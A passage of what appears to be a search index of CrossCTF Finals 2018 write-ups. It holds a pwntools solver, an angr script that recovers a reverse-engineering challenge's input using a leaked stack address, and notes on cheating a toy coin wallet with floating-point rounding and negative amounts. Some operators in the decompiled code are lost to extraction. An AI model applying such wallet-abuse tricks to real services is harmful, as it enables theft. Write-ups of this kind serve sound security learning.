range(i):\n            sol.append(chr(m[inp[j]].as_long()))\n        return ''.join(sol)  All is left is to connect to the server, and solve their outputs. Earlier in our pseudocode, we see that the program asks for a number 20 times, so we had to run a loop.  r = remote('ctf.pwn.sg', 16667) # process('./towerofbeer')\nr.sendline('6')\n\nfor i in range(20):\n    r.recvuntil( :P\\n )\n    num = int(r.recvuntil( \\n ).strip())\n\n    print num\n    ans = solve_for(num)\n    r.send(ans)\n    r.recvuntil('Your turn:')\n    print r.recv()\n    print r.recv()\n\nr.interactive()  You can get the whole solution script  here .", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort6/README/#some-eye-candy", 
            "text": "", 
            "title": "Some eye candy"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort8/README/", 
            "text": "CrossCTF Finals 2018 : Rochefort 8 (re)\n\n\n\n\nWhy have a Rochefort 6 when you can have a Rochefort 8?\n\n\nnc ctf.pwn.sg 16667\n\n\nCreator - waituck (@wongwaituck)\n\n\ntowerofbeer\n\n\n\n\nAnalysis\n\n\nLike \nrochefort6\n, it asks for a number, we choose 8, then it presents us with the challenge.\n\n\nBeing noob and using IDA gives us\n\n\nunsigned __int64 sub_401209()\n{\n  __int64 v1; // [rsp+8h] [rbp-158h]\n  char v2; // [rsp+10h] [rbp-150h]\n  __int64 v3; // [rsp+30h] [rbp-130h]\n  __int64 v4; // [rsp+38h] [rbp-128h]\n  __int64 v5; // [rsp+58h] [rbp-108h]\n  int v6; // [rsp+60h] [rbp-100h]\n  int *v7; // [rsp+68h] [rbp-F8h]\n  int *v8; // [rsp+70h] [rbp-F0h]\n  __int64 v9; // [rsp+78h] [rbp-E8h]\n  int *v10; // [rsp+80h] [rbp-E0h]\n  int v11; // [rsp+88h] [rbp-D8h]\n  __int64 v12; // [rsp+90h] [rbp-D0h]\n  int *v13; // [rsp+98h] [rbp-C8h]\n  int *v14; // [rsp+A0h] [rbp-C0h]\n  __int64 *v15; // [rsp+A8h] [rbp-B8h]\n  int v16; // [rsp+B0h] [rbp-B0h]\n  __int64 v17; // [rsp+B8h] [rbp-A8h]\n  int *v18; // [rsp+C0h] [rbp-A0h]\n  int *v19; // [rsp+C8h] [rbp-98h]\n  __int64 v20; // [rsp+D0h] [rbp-90h]\n  int v21; // [rsp+D8h] [rbp-88h]\n  __int64 *v22; // [rsp+E0h] [rbp-80h]\n  __int64 v23; // [rsp+E8h] [rbp-78h]\n  __int64 v24; // [rsp+F0h] [rbp-70h]\n  __int64 v25; // [rsp+F8h] [rbp-68h]\n  int v26; // [rsp+100h] [rbp-60h]\n  __int64 *v27; // [rsp+108h] [rbp-58h]\n  __int64 v28; // [rsp+110h] [rbp-50h]\n  __int64 v29; // [rsp+118h] [rbp-48h]\n  __int64 v30; // [rsp+120h] [rbp-40h]\n  int v31; // [rsp+128h] [rbp-38h]\n  __int64 v32; // [rsp+130h] [rbp-30h]\n  __int64 v33; // [rsp+138h] [rbp-28h]\n  int *v34; // [rsp+140h] [rbp-20h]\n  __int64 v35; // [rsp+148h] [rbp-18h]\n  unsigned __int64 v36; // [rsp+158h] [rbp-8h]\n\n  v36 = __readfsqword(0x28u);\n  if ( ptrace(0, 0LL, 1LL, 0LL) == -1 )\n  {\n    puts(\nSomething bad happened!\n);\n    exit(1);\n  }\n  printf(\nThis address may be interesting...\\n0x%lx\\n\n, \nv6);\n  v6 = 3;\n  v11 = 5;\n  v16 = 1;\n  v21 = 6;\n  v26 = 2;\n  v31 = 4;\n  v7 = \nv11;\n  v8 = \nv16;\n  v9 = 0LL;\n  v10 = \nv11;\n  v12 = -3LL;\n  v13 = \nv21;\n  v14 = \nv26;\n  v15 = \nv4;\n  v17 = 0x7FFFFFFFFFFFFFFFLL;\n  v18 = \nv26;\n  v19 = \nv31;\n  v20 = 0LL;\n  v22 = \nv3;\n  v23 = 0LL;\n  v24 = 0LL;\n  v25 = -3405691582LL;\n  v27 = \nv5;\n  v28 = 0LL;\n  v29 = 0LL;\n  v30 = -1LL;\n  v32 = 0LL;\n  v33 = 1LL;\n  v34 = \nv21;\n  v35 = 0LL;\n  puts(\nNow let's see if you can read my mind. Give me 10 numbers!\n);\n  sub_4009D6((__int64)\nv2);\n  v1 = 0LL;\n  some_func((__int64)\nv6, (__int64)\nv2, \nv1);\n  if ( v1 != 5 )\n  {\n    puts(\nFAIL\n);\n    exit(1);\n  }\n  sub_400CAC();\n  return __readfsqword(0x28u) ^ v36;\n}\n\n\n\n\n__int64 __fastcall sub_4009D6(__int64 a1)\n{\n  __int64 result; // rax\n\n  result = (signed int)__isoc99_scanf(\n                         \n%ld %ld %ld %ld %ld %ld %ld %ld %ld %ld\n,\n                         a1,\n                         a1 + 8,\n                         a1 + 16,\n                         a1 + 24,\n                         a1 + 32,\n                         a1 + 40,\n                         a1 + 48,\n                         a1 + 56,\n                         a1 + 64,\n                         a1 + 72);\n  if ( (unsigned __int64)(signed int)result \n= 9 )\n  {\n    puts(\nFAIL\n);\n    exit(1);\n  }\n  return result;\n}\n\n\n\n\n__int64 __fastcall some_func(__int64 a1, __int64 a2, _QWORD *a3)\n{\n  __int64 result; // rax\n  _QWORD *v4; // [rsp+8h] [rbp-38h]\n  __int64 v5; // [rsp+30h] [rbp-10h]\n  __int64 v6; // [rsp+38h] [rbp-8h]\n\n  v4 = a3;\n  v5 = sub_400D4E(a1);\n  result = sub_400DC3(a1);\n  v6 = result;\n  if ( v5 )\n  {\n    if ( (unsigned __int8)sub_400F22(a1, v5, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 1) )\n      ++*v4;\n    result = some_func(v5, a2, v4);\n  }\n  if ( v6 )\n  {\n    if ( (unsigned __int8)sub_400F22(a1, v6, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 0) )\n      ++*v4;\n    result = some_func(v6, a2, v4);\n  }\n  return result;\n}\n\n\n\n\n_BOOL8 __fastcall sub_400F22(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5)\n{\n  char v6; // [rsp+4h] [rbp-74h]\n  __int64 v7; // [rsp+8h] [rbp-70h]\n  __int64 v8; // [rsp+10h] [rbp-68h]\n  __int64 v9; // [rsp+28h] [rbp-50h]\n  __int64 v10; // [rsp+30h] [rbp-48h]\n  __int64 v11; // [rsp+38h] [rbp-40h]\n  __int64 v12; // [rsp+40h] [rbp-38h]\n  __int64 v13; // [rsp+58h] [rbp-20h]\n  __int64 v14; // [rsp+60h] [rbp-18h]\n\n  v8 = a3;\n  v7 = a4;\n  v6 = a5;\n  v9 = sub_400E38(a1);\n  v10 = sub_400E38(a2);\n  if ( v6 )\n  {\n    if ( v9 \n= v8 )\n      return 0LL;\n  }\n  else if ( v9 \n= v8 )\n  {\n    return 0LL;\n  }\n  if ( v8 == v10 )\n    return 0LL;\n  v11 = sub_400D4E(a2);\n  v12 = sub_400DC3(a2);\n  if ( v11 \n sub_400E38(v11) \n= v8 )\n    return 0LL;\n  if ( v12 \n sub_400E38(v12) \n= v8 )\n    return 0LL;\n  v13 = sub_400EAD(a1);\n  v14 = sub_400EAD(a2);\n  if ( v6 )\n  {\n    if ( v13 \n= v7 )\n      return 0LL;\n  }\n  else if ( v13 \n= v7 )\n  {\n    return 0LL;\n  }\n  if ( v7 == v14 )\n    return 0LL;\n  if ( v11 \n sub_400EAD(v11) \n= v7 )\n    return 0LL;\n  return !v12 || sub_400EAD(v12) \n v7;\n}\n\n\n\n\nVery long code, to summarize, it\n\n\n\n\nPrints out an address on the stack\n\n\nDoes a ton of initialization on the variables\n\n\nCalls scanf to read in 10 signed integers\n\n\nCalls \nsome_func\n (it was a stripped binary, I named it this) with some paremeters, that seemed to be stack addresses casted to integer.\n\n\nIf the result is equal to 5, print flag\n\n\n\n\nIn \nsome_func\n and \nsub_400F22\n, we see 3 more different functions.\n\n\n__int64 __fastcall sub_400D4E(__int64 a1)\n{\n  __int64 result; // rax\n\n  if ( !a1 )\n    return 0LL;\n  switch ( *(_DWORD *)a1 )\n  {\n    case 1:\n      result = *(_QWORD *)(a1 + 24);\n      break;\n    case 2:\n      result = *(_QWORD *)(a1 + 16);\n      break;\n    case 3:\n      result = *(_QWORD *)(a1 + 8);\n      break;\n    case 4:\n      result = *(_QWORD *)(a1 + 32);\n      break;\n    case 5:\n      result = *(_QWORD *)(a1 + 16);\n      break;\n    case 6:\n      result = *(_QWORD *)(a1 + 24);\n      break;\n    default:\n      result = 0LL;\n      break;\n  }\n  return result;\n}\n\n\n\n\nThis function uses the argument passed in as an array, and returns the value in an index that is based on the first element in the array. \n\n\nThe other 2 were pretty much the same, just that the offset values were different.\n\n\nReversing them\n\n\nLots of functions, lots of adding and subtracting, lots of casting from integer to pointer, and seems like there's even recursion. It's gonna be a pain to reverse them.\n\n\nSo nah man I didn't want to reverse this. I just used angr to do the work. Yes, I really didn't bother reversing it at all.\n\n\nSolution\n\n\nI wrote a \nscript\n with angr to make things easier. (The following is more of my thought process, if not interested, looking at the script should be enough)\n\n\nFirst things first, create a project in angr, and initialize a state that starts at \nsub_401209\n, which is the function called after we enter \"8\" into the program (because everything before that is useless). \n\n\nbinary_name = sys.argv[1]\nproject = angr.Project(binary_name)\ninitial_state = project.factory.blank_state(addr=0x401209)\n\n\n\n\nAlso, I have to \"define\" \nscanf\n myself because angr does not work well with format string related stuff. Inside my own \nscanf\n, I created 10 symbolic values to represent our input, and store them in memory. In the end, set return value to be 10, because the program checks for it.\n\n\nThat being said, I also have to \"skip\" the instruction at 0x40126f which calls \nprintf\n. \n(If you reversed the binary, you may feel that something's wrong, because the output of \nprintf\n is important. Yes, I made a mistake, which I'll mention later.)\n\n\ninitial_state.globals['solutions'] = []\n\nclass ReplacementScanf(angr.SimProcedure):\n  def run(self, format_string, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10):\n  scanf1 = claripy.BVS('scanf1', 64)\n  scanf2 = claripy.BVS('scanf2', 64)\n  scanf3 = claripy.BVS('scanf3', 64)\n  scanf4 = claripy.BVS('scanf4', 64)\n  scanf5 = claripy.BVS('scanf5', 64)\n  scanf6 = claripy.BVS('scanf6', 64)\n  scanf7 = claripy.BVS('scanf7', 64)\n  scanf8 = claripy.BVS('scanf8', 64)\n  scanf9 = claripy.BVS('scanf9', 64)\n  scanf10 = claripy.BVS('scanf10', 64)\n\n  # The scanf function writes user input to the buffers to which the \n  # parameters point.\n  self.state.memory.store(s1, scanf1, endness=project.arch.memory_endness)\n  self.state.memory.store(s2, scanf2, endness=project.arch.memory_endness)\n  self.state.memory.store(s3, scanf3, endness=project.arch.memory_endness)\n  self.state.memory.store(s4, scanf4, endness=project.arch.memory_endness)\n  self.state.memory.store(s5, scanf5, endness=project.arch.memory_endness)\n  self.state.memory.store(s6, scanf6, endness=project.arch.memory_endness)\n  self.state.memory.store(s7, scanf7, endness=project.arch.memory_endness)\n  self.state.memory.store(s8, scanf8, endness=project.arch.memory_endness)\n  self.state.memory.store(s9, scanf9, endness=project.arch.memory_endness)\n  self.state.memory.store(s10, scanf10, endness=project.arch.memory_endness)\n\n  self.state.globals['solutions'].append(scanf1)\n  self.state.globals['solutions'].append(scanf2)\n  self.state.globals['solutions'].append(scanf3)\n  self.state.globals['solutions'].append(scanf4)\n  self.state.globals['solutions'].append(scanf5)\n  self.state.globals['solutions'].append(scanf6)\n  self.state.globals['solutions'].append(scanf7)\n  self.state.globals['solutions'].append(scanf8)\n  self.state.globals['solutions'].append(scanf9)\n  self.state.globals['solutions'].append(scanf10)\n\n  self.state.regs.rax = 10\n\nscanf_symbol = '__isoc99_scanf'\nproject.hook_symbol(scanf_symbol, ReplacementScanf())\n\ninstruction_to_skip_length = 5\n@project.hook(0x40126f, length=instruction_to_skip_length)\ndef skip_printf(state):\n  pass\n\n\n\n\nThen, I created a \nsimulation_manager\n to explore the binary, with the target address at 0x401441, which is the first instruction after we passed the check, and to avoid 0x40145d, which is the first instruction after we failed the check.\n\n\nsimgr = project.factory.simgr(initial_state)\n\nsimgr.explore(find=0x401441, avoid=0x40145d)\n\n\n\n\nIf the simulation managed to reach the target address, print out the values in our input.\n\n\nif simgr.found:\n  print 'found'\n  solution_state = simgr.found[0]\n\n  # Grab whatever you set aside in the globals dict.\n  stored_solutions = solution_state.globals['solutions']\n\n  for i in range(len(stored_solutions)):\n    sol = solution_state.se.eval(stored_solutions[i])\n    # 2's complement\n    sol = -(0x10000000000000000 - sol) if sol \n= 0x8000000000000000 else sol\n    sys.stdout.write(str(sol))\n    sys.stdout.write(' ')\n\n  print ''\nelse:\n  raise Exception('Could not find the solution')\n\n\n\n\nNotice that since the program called \nscanf\n to read in \nsigned\n integers, and claripy (angr's solver engine) gives us the unsigned value, I needed to find the 2's complement myself.\n\n\nAnyways, running the script, and waiting for around 4 minutes gave me 10 numbers. But the program tells me \nFAIL\n...\n\n\nBut I felt confident that using angr should work, I must be missing something then. And, I realized the \nprintf\n is used to print an address in the stack, and it says \"this address may be interesting\". So I asked my teammate why is this useful, then big realization oh right there were some parts where pointers were casted into integers.\n\n\nSome re-addressing\n\n\nFixing this was pretty easy, just initialize the stack frame of our state. And choose our state to start at the first instruction after \nprintf\n was called, since everything before that was just lame stuff like function prologue, saving stack canary, calling \nptrace\n so that we couldn't run gdb, etc.\n\n\nleak = sys.argv[2]\ninitial_state = project.factory.blank_state(addr=0x401274)\ninitial_state.regs.rsp = leak - 0x60\ninitial_state.regs.rbp = leak + 0x100\n\n\n\n\nInstead of just running the script, this time we need to get the address from the service first, after that waiting for another painful 4 minutes, we get the flag.\n\n\nCrossCTF{@n_Un1iK3Ly_Un10n}", 
            "title": "Tower Of Beer: Rochefort 8"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort8/README/#crossctf-finals-2018-rochefort-8-re", 
            "text": "Why have a Rochefort 6 when you can have a Rochefort 8?  nc ctf.pwn.sg 16667  Creator - waituck (@wongwaituck)  towerofbeer", 
            "title": "CrossCTF Finals 2018 : Rochefort 8 (re)"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort8/README/#analysis", 
            "text": "Like  rochefort6 , it asks for a number, we choose 8, then it presents us with the challenge.  Being noob and using IDA gives us  unsigned __int64 sub_401209()\n{\n  __int64 v1; // [rsp+8h] [rbp-158h]\n  char v2; // [rsp+10h] [rbp-150h]\n  __int64 v3; // [rsp+30h] [rbp-130h]\n  __int64 v4; // [rsp+38h] [rbp-128h]\n  __int64 v5; // [rsp+58h] [rbp-108h]\n  int v6; // [rsp+60h] [rbp-100h]\n  int *v7; // [rsp+68h] [rbp-F8h]\n  int *v8; // [rsp+70h] [rbp-F0h]\n  __int64 v9; // [rsp+78h] [rbp-E8h]\n  int *v10; // [rsp+80h] [rbp-E0h]\n  int v11; // [rsp+88h] [rbp-D8h]\n  __int64 v12; // [rsp+90h] [rbp-D0h]\n  int *v13; // [rsp+98h] [rbp-C8h]\n  int *v14; // [rsp+A0h] [rbp-C0h]\n  __int64 *v15; // [rsp+A8h] [rbp-B8h]\n  int v16; // [rsp+B0h] [rbp-B0h]\n  __int64 v17; // [rsp+B8h] [rbp-A8h]\n  int *v18; // [rsp+C0h] [rbp-A0h]\n  int *v19; // [rsp+C8h] [rbp-98h]\n  __int64 v20; // [rsp+D0h] [rbp-90h]\n  int v21; // [rsp+D8h] [rbp-88h]\n  __int64 *v22; // [rsp+E0h] [rbp-80h]\n  __int64 v23; // [rsp+E8h] [rbp-78h]\n  __int64 v24; // [rsp+F0h] [rbp-70h]\n  __int64 v25; // [rsp+F8h] [rbp-68h]\n  int v26; // [rsp+100h] [rbp-60h]\n  __int64 *v27; // [rsp+108h] [rbp-58h]\n  __int64 v28; // [rsp+110h] [rbp-50h]\n  __int64 v29; // [rsp+118h] [rbp-48h]\n  __int64 v30; // [rsp+120h] [rbp-40h]\n  int v31; // [rsp+128h] [rbp-38h]\n  __int64 v32; // [rsp+130h] [rbp-30h]\n  __int64 v33; // [rsp+138h] [rbp-28h]\n  int *v34; // [rsp+140h] [rbp-20h]\n  __int64 v35; // [rsp+148h] [rbp-18h]\n  unsigned __int64 v36; // [rsp+158h] [rbp-8h]\n\n  v36 = __readfsqword(0x28u);\n  if ( ptrace(0, 0LL, 1LL, 0LL) == -1 )\n  {\n    puts( Something bad happened! );\n    exit(1);\n  }\n  printf( This address may be interesting...\\n0x%lx\\n ,  v6);\n  v6 = 3;\n  v11 = 5;\n  v16 = 1;\n  v21 = 6;\n  v26 = 2;\n  v31 = 4;\n  v7 =  v11;\n  v8 =  v16;\n  v9 = 0LL;\n  v10 =  v11;\n  v12 = -3LL;\n  v13 =  v21;\n  v14 =  v26;\n  v15 =  v4;\n  v17 = 0x7FFFFFFFFFFFFFFFLL;\n  v18 =  v26;\n  v19 =  v31;\n  v20 = 0LL;\n  v22 =  v3;\n  v23 = 0LL;\n  v24 = 0LL;\n  v25 = -3405691582LL;\n  v27 =  v5;\n  v28 = 0LL;\n  v29 = 0LL;\n  v30 = -1LL;\n  v32 = 0LL;\n  v33 = 1LL;\n  v34 =  v21;\n  v35 = 0LL;\n  puts( Now let's see if you can read my mind. Give me 10 numbers! );\n  sub_4009D6((__int64) v2);\n  v1 = 0LL;\n  some_func((__int64) v6, (__int64) v2,  v1);\n  if ( v1 != 5 )\n  {\n    puts( FAIL );\n    exit(1);\n  }\n  sub_400CAC();\n  return __readfsqword(0x28u) ^ v36;\n}  __int64 __fastcall sub_4009D6(__int64 a1)\n{\n  __int64 result; // rax\n\n  result = (signed int)__isoc99_scanf(\n                          %ld %ld %ld %ld %ld %ld %ld %ld %ld %ld ,\n                         a1,\n                         a1 + 8,\n                         a1 + 16,\n                         a1 + 24,\n                         a1 + 32,\n                         a1 + 40,\n                         a1 + 48,\n                         a1 + 56,\n                         a1 + 64,\n                         a1 + 72);\n  if ( (unsigned __int64)(signed int)result  = 9 )\n  {\n    puts( FAIL );\n    exit(1);\n  }\n  return result;\n}  __int64 __fastcall some_func(__int64 a1, __int64 a2, _QWORD *a3)\n{\n  __int64 result; // rax\n  _QWORD *v4; // [rsp+8h] [rbp-38h]\n  __int64 v5; // [rsp+30h] [rbp-10h]\n  __int64 v6; // [rsp+38h] [rbp-8h]\n\n  v4 = a3;\n  v5 = sub_400D4E(a1);\n  result = sub_400DC3(a1);\n  v6 = result;\n  if ( v5 )\n  {\n    if ( (unsigned __int8)sub_400F22(a1, v5, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 1) )\n      ++*v4;\n    result = some_func(v5, a2, v4);\n  }\n  if ( v6 )\n  {\n    if ( (unsigned __int8)sub_400F22(a1, v6, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 0) )\n      ++*v4;\n    result = some_func(v6, a2, v4);\n  }\n  return result;\n}  _BOOL8 __fastcall sub_400F22(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5)\n{\n  char v6; // [rsp+4h] [rbp-74h]\n  __int64 v7; // [rsp+8h] [rbp-70h]\n  __int64 v8; // [rsp+10h] [rbp-68h]\n  __int64 v9; // [rsp+28h] [rbp-50h]\n  __int64 v10; // [rsp+30h] [rbp-48h]\n  __int64 v11; // [rsp+38h] [rbp-40h]\n  __int64 v12; // [rsp+40h] [rbp-38h]\n  __int64 v13; // [rsp+58h] [rbp-20h]\n  __int64 v14; // [rsp+60h] [rbp-18h]\n\n  v8 = a3;\n  v7 = a4;\n  v6 = a5;\n  v9 = sub_400E38(a1);\n  v10 = sub_400E38(a2);\n  if ( v6 )\n  {\n    if ( v9  = v8 )\n      return 0LL;\n  }\n  else if ( v9  = v8 )\n  {\n    return 0LL;\n  }\n  if ( v8 == v10 )\n    return 0LL;\n  v11 = sub_400D4E(a2);\n  v12 = sub_400DC3(a2);\n  if ( v11   sub_400E38(v11)  = v8 )\n    return 0LL;\n  if ( v12   sub_400E38(v12)  = v8 )\n    return 0LL;\n  v13 = sub_400EAD(a1);\n  v14 = sub_400EAD(a2);\n  if ( v6 )\n  {\n    if ( v13  = v7 )\n      return 0LL;\n  }\n  else if ( v13  = v7 )\n  {\n    return 0LL;\n  }\n  if ( v7 == v14 )\n    return 0LL;\n  if ( v11   sub_400EAD(v11)  = v7 )\n    return 0LL;\n  return !v12 || sub_400EAD(v12)   v7;\n}  Very long code, to summarize, it   Prints out an address on the stack  Does a ton of initialization on the variables  Calls scanf to read in 10 signed integers  Calls  some_func  (it was a stripped binary, I named it this) with some paremeters, that seemed to be stack addresses casted to integer.  If the result is equal to 5, print flag   In  some_func  and  sub_400F22 , we see 3 more different functions.  __int64 __fastcall sub_400D4E(__int64 a1)\n{\n  __int64 result; // rax\n\n  if ( !a1 )\n    return 0LL;\n  switch ( *(_DWORD *)a1 )\n  {\n    case 1:\n      result = *(_QWORD *)(a1 + 24);\n      break;\n    case 2:\n      result = *(_QWORD *)(a1 + 16);\n      break;\n    case 3:\n      result = *(_QWORD *)(a1 + 8);\n      break;\n    case 4:\n      result = *(_QWORD *)(a1 + 32);\n      break;\n    case 5:\n      result = *(_QWORD *)(a1 + 16);\n      break;\n    case 6:\n      result = *(_QWORD *)(a1 + 24);\n      break;\n    default:\n      result = 0LL;\n      break;\n  }\n  return result;\n}  This function uses the argument passed in as an array, and returns the value in an index that is based on the first element in the array.   The other 2 were pretty much the same, just that the offset values were different.", 
            "title": "Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort8/README/#reversing-them", 
            "text": "Lots of functions, lots of adding and subtracting, lots of casting from integer to pointer, and seems like there's even recursion. It's gonna be a pain to reverse them.  So nah man I didn't want to reverse this. I just used angr to do the work. Yes, I really didn't bother reversing it at all.", 
            "title": "Reversing them"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort8/README/#solution", 
            "text": "I wrote a  script  with angr to make things easier. (The following is more of my thought process, if not interested, looking at the script should be enough)  First things first, create a project in angr, and initialize a state that starts at  sub_401209 , which is the function called after we enter \"8\" into the program (because everything before that is useless).   binary_name = sys.argv[1]\nproject = angr.Project(binary_name)\ninitial_state = project.factory.blank_state(addr=0x401209)  Also, I have to \"define\"  scanf  myself because angr does not work well with format string related stuff. Inside my own  scanf , I created 10 symbolic values to represent our input, and store them in memory. In the end, set return value to be 10, because the program checks for it.  That being said, I also have to \"skip\" the instruction at 0x40126f which calls  printf . \n(If you reversed the binary, you may feel that something's wrong, because the output of  printf  is important. Yes, I made a mistake, which I'll mention later.)  initial_state.globals['solutions'] = []\n\nclass ReplacementScanf(angr.SimProcedure):\n  def run(self, format_string, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10):\n  scanf1 = claripy.BVS('scanf1', 64)\n  scanf2 = claripy.BVS('scanf2', 64)\n  scanf3 = claripy.BVS('scanf3', 64)\n  scanf4 = claripy.BVS('scanf4', 64)\n  scanf5 = claripy.BVS('scanf5', 64)\n  scanf6 = claripy.BVS('scanf6', 64)\n  scanf7 = claripy.BVS('scanf7', 64)\n  scanf8 = claripy.BVS('scanf8', 64)\n  scanf9 = claripy.BVS('scanf9', 64)\n  scanf10 = claripy.BVS('scanf10', 64)\n\n  # The scanf function writes user input to the buffers to which the \n  # parameters point.\n  self.state.memory.store(s1, scanf1, endness=project.arch.memory_endness)\n  self.state.memory.store(s2, scanf2, endness=project.arch.memory_endness)\n  self.state.memory.store(s3, scanf3, endness=project.arch.memory_endness)\n  self.state.memory.store(s4, scanf4, endness=project.arch.memory_endness)\n  self.state.memory.store(s5, scanf5, endness=project.arch.memory_endness)\n  self.state.memory.store(s6, scanf6, endness=project.arch.memory_endness)\n  self.state.memory.store(s7, scanf7, endness=project.arch.memory_endness)\n  self.state.memory.store(s8, scanf8, endness=project.arch.memory_endness)\n  self.state.memory.store(s9, scanf9, endness=project.arch.memory_endness)\n  self.state.memory.store(s10, scanf10, endness=project.arch.memory_endness)\n\n  self.state.globals['solutions'].append(scanf1)\n  self.state.globals['solutions'].append(scanf2)\n  self.state.globals['solutions'].append(scanf3)\n  self.state.globals['solutions'].append(scanf4)\n  self.state.globals['solutions'].append(scanf5)\n  self.state.globals['solutions'].append(scanf6)\n  self.state.globals['solutions'].append(scanf7)\n  self.state.globals['solutions'].append(scanf8)\n  self.state.globals['solutions'].append(scanf9)\n  self.state.globals['solutions'].append(scanf10)\n\n  self.state.regs.rax = 10\n\nscanf_symbol = '__isoc99_scanf'\nproject.hook_symbol(scanf_symbol, ReplacementScanf())\n\ninstruction_to_skip_length = 5\n@project.hook(0x40126f, length=instruction_to_skip_length)\ndef skip_printf(state):\n  pass  Then, I created a  simulation_manager  to explore the binary, with the target address at 0x401441, which is the first instruction after we passed the check, and to avoid 0x40145d, which is the first instruction after we failed the check.  simgr = project.factory.simgr(initial_state)\n\nsimgr.explore(find=0x401441, avoid=0x40145d)  If the simulation managed to reach the target address, print out the values in our input.  if simgr.found:\n  print 'found'\n  solution_state = simgr.found[0]\n\n  # Grab whatever you set aside in the globals dict.\n  stored_solutions = solution_state.globals['solutions']\n\n  for i in range(len(stored_solutions)):\n    sol = solution_state.se.eval(stored_solutions[i])\n    # 2's complement\n    sol = -(0x10000000000000000 - sol) if sol  = 0x8000000000000000 else sol\n    sys.stdout.write(str(sol))\n    sys.stdout.write(' ')\n\n  print ''\nelse:\n  raise Exception('Could not find the solution')  Notice that since the program called  scanf  to read in  signed  integers, and claripy (angr's solver engine) gives us the unsigned value, I needed to find the 2's complement myself.  Anyways, running the script, and waiting for around 4 minutes gave me 10 numbers. But the program tells me  FAIL ...  But I felt confident that using angr should work, I must be missing something then. And, I realized the  printf  is used to print an address in the stack, and it says \"this address may be interesting\". So I asked my teammate why is this useful, then big realization oh right there were some parts where pointers were casted into integers.", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort8/README/#some-re-addressing", 
            "text": "Fixing this was pretty easy, just initialize the stack frame of our state. And choose our state to start at the first instruction after  printf  was called, since everything before that was just lame stuff like function prologue, saving stack canary, calling  ptrace  so that we couldn't run gdb, etc.  leak = sys.argv[2]\ninitial_state = project.factory.blank_state(addr=0x401274)\ninitial_state.regs.rsp = leak - 0x60\ninitial_state.regs.rbp = leak + 0x100  Instead of just running the script, this time we need to get the address from the service first, after that waiting for another painful 4 minutes, we get the flag.  CrossCTF{@n_Un1iK3Ly_Un10n}", 
            "title": "Some re-addressing"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoin/README/", 
            "text": "CrossCTF Finals 2018: GoCoin! (web)\n\n\n\n\nI thought blockchain was cool, so I made my own coin.\n\n\nhttp://ctf.pwn.sg:8182\n\n\nCreator - quanyang (@quanyang)\n\n\n\n\nChallenge\n\n\nWe are given a nice site, that emulates a wallet. \n\n\n\n\nClicking on deposit and withdraw goes to \n/deposit?amount=1\n and \n/withdraw?amount=1\n respectively. Instincts are to see if you can input other amounts. \n\n\n\n\nMessing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of \nComputer Organisation\n lessons?)\n\n\nIf you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet! \n\n\n\n\nI'm not gonna go into floating point operations and stop here. Must have been some \nrounding errors!\n\n\nAlternative exploit\n\n\nYes, I actually missed this exploit that I only realised in \nGoCoin! Plus\n. You could simply specify negative amounts because it missed out negative checks:", 
            "title": "GoCoin!"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoin/README/#crossctf-finals-2018-gocoin-web", 
            "text": "I thought blockchain was cool, so I made my own coin.  http://ctf.pwn.sg:8182  Creator - quanyang (@quanyang)", 
            "title": "CrossCTF Finals 2018: GoCoin! (web)"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoin/README/#challenge", 
            "text": "We are given a nice site, that emulates a wallet.    Clicking on deposit and withdraw goes to  /deposit?amount=1  and  /withdraw?amount=1  respectively. Instincts are to see if you can input other amounts.    Messing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of  Computer Organisation  lessons?)  If you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet!    I'm not gonna go into floating point operations and stop here. Must have been some  rounding errors!", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoin/README/#alternative-exploit", 
            "text": "Yes, I actually missed this exploit that I only realised in  GoCoin! Plus . You could simply specify negative amounts because it missed out negative checks:", 
            "title": "Alternative exploit"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoinplus/README/", 
            "text": "CrossCTF Finals 2018: GoCoin! Plus (web)\n\n\n\n\nI thought blockchain was cool, so I made my own coin.\n\n\nGoCoin! Plus is the forked and improved version of GoCoin!.\n\n\nUpdate: I've improved it! More secures and with real cryptos, it's a true cryptocoin now!\n\n\nhttp://ctf.pwn.sg:2053\n\n\nCreator - quanyang (@quanyang)\n\n\n\n\nChallenge\n\n\nOkay, the organisers made a mistake in this one. See \nGoCoin! Plus Plus\n for the real solution. \n\n\nSo, a nice webpage. The first time you load it you get a nice message meant for you:\n\n\n\n\nHere's the page you get to after a refresh.\n\n\n\n\nThe public key gave us a hint. Does it have something to do with crypto?\n\n\n\n\nSimilar to the previous challenge, it's got the same buttons with the same URL. Just wrapped in a fancier page. \n\n\nWhen we looked at the source provided, we first noticed it used JWT. However, before looking for implementation flaws, we noticed the flaw we didn't notice in the previous challenge: There was no check for the amount entered being less than 0. So we exploited it right away.", 
            "title": "GoCoin! Plus"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoinplus/README/#crossctf-finals-2018-gocoin-plus-web", 
